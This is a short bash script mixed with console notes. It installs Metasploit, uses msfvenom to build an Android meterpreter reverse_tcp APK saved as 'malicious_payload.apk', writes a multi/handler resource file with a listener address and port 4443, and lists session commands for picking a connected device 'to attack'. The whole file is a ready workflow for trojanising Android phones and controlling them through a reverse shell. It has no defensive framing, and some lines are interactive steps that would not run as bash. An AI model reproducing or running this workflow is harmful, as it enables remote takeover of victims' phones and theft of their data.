#!/bin/bash -e
sudo apt update # update os packages
sudo apt install vim net-tools screen # install editor vim
sudo apt install metasploit-framework # install metasploit
msfvenom -h

# create payload
msfvenom -p android/meterpreter/reverse_tcp LHOST="$PUBLIC_PI" LPORT=4443 R > ./malicious_payload.apk

# script auto start reverse shell to listen
touch android_reverse_tcp.rc
echo "use exploit/multi/handler
    set payload android/meterpreter/reverse_tcp
    set LHOST 172.31.19.235
    set LPORT 4443
    set ExitOnSession false
    exploit -j -z" > android_reverse_tcp.rc 

screen # use screen to manage multi session
msfconsole
resource /home/kali/android_reverse_tcp.rc # start listern on port 4443
On MacOS: Ctl + A then D # to detach session

# attach again
screen -ls
screen -r id
sessions # list all connected session
sessions -i 1|2|3 # select a connection to attack
help # review all available attack command
background # back to list sessions